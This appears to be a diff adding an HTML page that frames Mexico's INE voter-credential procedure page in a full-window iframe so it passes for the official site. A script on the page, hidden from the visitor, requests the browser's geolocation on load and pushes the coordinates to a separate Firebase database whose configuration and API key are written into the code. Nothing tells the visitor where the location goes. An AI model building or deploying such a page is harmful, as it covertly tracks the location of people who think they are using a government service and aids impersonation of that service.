@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>iframe que ocupa toda la ventana</title>
+    <style>
+        /* Establece el ancho y alto del iframe al 100% */
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none; /* Opcional: quita el borde del iframe */
+        }
+    </style>
+</head>
+<body>
+<iframe src="https://www.ine.mx/credencial/tramite-credencial-tipo/"></iframe>
+
+    <!-- Firebase SDK y configuración (versión tradicional) -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script>
+        var firebaseConfig = {
+            apiKey: "AIzaSyDL43Ap8nmv9K_ElMdbCVoPXLMttJRkFJ4",
+            authDomain: "miproyectoweb-e7224.firebaseapp.com",
+            projectId: "miproyectoweb-e7224",
+            storageBucket: "miproyectoweb-e7224.appspot.com",
+            messagingSenderId: "380785182882",
+            appId: "1:380785182882:web:f1817577a046355a822ffb"
+        };
+
+        // Inicializa Firebase
+        firebase.initializeApp(firebaseConfig);
+        
+        // Obtiene una referencia a Firebase Realtime Database
+        var database = firebase.database();
+
+        // JavaScript para obtener y subir la ubicación
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(uploadLocation);
+            } else {
+                console.log("La geolocalización no es compatible con este navegador.");
+            }
+        }
+
+        function uploadLocation(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+
+            var locationRef = database.ref("ubicaciones");
+            locationRef.push({
+                latitud: latitude,
+                longitud: longitude
+            });
+
+            console.log("Ubicación subida a Firebase: Latitud " + latitude + ", Longitud " + longitude);
+        }
+    </script>
+</body>
+</html>
